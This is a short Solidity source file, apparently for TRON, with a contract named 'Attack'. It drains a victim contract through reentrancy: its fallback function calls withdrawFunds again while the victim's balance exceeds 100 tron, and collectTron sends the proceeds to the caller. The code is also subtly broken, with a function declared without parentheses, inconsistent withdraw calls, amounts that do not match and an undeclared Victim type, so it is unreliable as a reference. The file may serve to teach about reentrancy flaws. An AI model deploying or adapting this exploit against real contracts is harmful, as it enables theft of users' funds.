pragma solidity ^0.4.25;

contract Attack {

Victim public victim;

constructor(address _victimAddress){
    victim = Victim(_victimAddress);

}

    function depositFunds public payable {
        require(msg.value>= 1 tron);

        victim.deposit.value(100 tron)();

        victim.withdraw(1 tron);
    }

    function collectTron() public {
      msg.sender.transfer(this.balance);
    }

    function () payable {
      if (victim.balance > 100 tron) {
          victim.withdrawFunds(100 tron);
      }
    }


}